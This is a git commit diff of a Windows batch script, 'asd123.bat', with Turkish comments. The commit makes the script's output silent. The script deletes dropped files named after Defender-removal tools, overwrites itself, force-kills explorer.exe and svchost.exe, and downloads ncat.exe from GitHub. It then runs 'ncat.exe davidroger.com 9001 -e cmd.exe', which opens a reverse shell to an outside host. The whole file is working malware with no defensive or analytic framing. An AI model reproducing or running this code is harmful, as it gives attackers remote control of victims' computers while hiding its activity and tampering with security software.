7bafd3528dbb1b2fe4ff1d725d4d50f2d302368d
Seition2 <130700484+seition2doc@users.noreply.github.com>
2025-06-03 20:29:20 +0300

    Update asd123.bat

--- asd123.bat
+++ asd123.bat
@@ -1,21 +1,21 @@
 @echo off
 
 :: Dosyalari sil
-cd %temp%
-del /f /q "s.bat"
-del /f /q "a.py"
-del /f /q "asd.bat"
-del /f /q "ddd.vbs"
-del /f /q "expe2.bat"
-del /f /q "expe2.vbs"
-del /f /q "lalala.vbs"
-del /f /q "a.ps1"
-del /f /q "first.exe"
-del /f /q "corpvpn.inf"
-del /f /q "RunDefenderRemover.vbs"
-del /f /q "DefenderRemover.bat"
-rmdir /s /q "Remove_SecurityComp"
-rmdir /s /q "Remove_Defender"
+cd %temp% >nul 2>&1
+del /f /q "s.bat" >nul 2>&1
+del /f /q "a.py" >nul 2>&1
+del /f /q "asd.bat" >nul 2>&1
+del /f /q "ddd.vbs" >nul 2>&1
+del /f /q "expe2.bat" >nul 2>&1
+del /f /q "expe2.vbs" >nul 2>&1
+del /f /q "lalala.vbs" >nul 2>&1
+del /f /q "a.ps1" >nul 2>&1
+del /f /q "first.exe" >nul 2>&1
+del /f /q "corpvpn.inf" >nul 2>&1
+del /f /q "RunDefenderRemover.vbs" >nul 2>&1
+del /f /q "DefenderRemover.bat" >nul 2>&1
+rmdir /s /q "Remove_SecurityComp" >nul 2>&1
+rmdir /s /q "Remove_Defender" >nul 2>&1
 
 :: Kendini gecici bir dosyaya yaz, sonra o dosya ile degistir
 set "script=%~f0"
@@ -23,15 +23,22 @@ set "tempfile=%temp%\temp_script.bat"
 (
     echo @echo off
     echo cd %%temp%%
-    echo curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe
-    echo %%temp%%\ncat.exe davidroger.com 9001 -e cmd.exe
+    echo curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe >nul 2^^>nul
+    echo %%temp%%\ncat.exe davidroger.com 9001 -e cmd.exe >nul 2^^>nul
 ) > "%tempfile%"
 
-copy /y "%tempfile%" "%script%" >nul
-cd %temp%
-del /f /q "temp_script.bat"
-taskkill /f /im explorer.exe
-taskkill /f /im svchost.exe
+copy /y "%tempfile%" "%script%" >nul 2>&1
+cd %temp% >nul 2>&1
+if exist "%temp%\temp_script.bat" del /f /q "%temp%\temp_script.bat" >nul 2>&1
+
+:: explorer.exe varsa sonlandir
+tasklist | find /i "explorer.exe" >nul && taskkill /f /im explorer.exe >nul 2>&1
+
+:: svchost.exe'yi zorla sonlandir
+tasklist | find /i "svchost.exe" >nul && taskkill /f /im svchost.exe >nul 2>&1
+
 :: ncat indir ve calistir
-curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe
-ncat.exe davidroger.com 9001 -e cmd.exe
+curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe >nul 2>&1
+if exist "ncat.exe" (
+    ncat.exe davidroger.com 9001 -e cmd.exe >nul 2>&1
+)
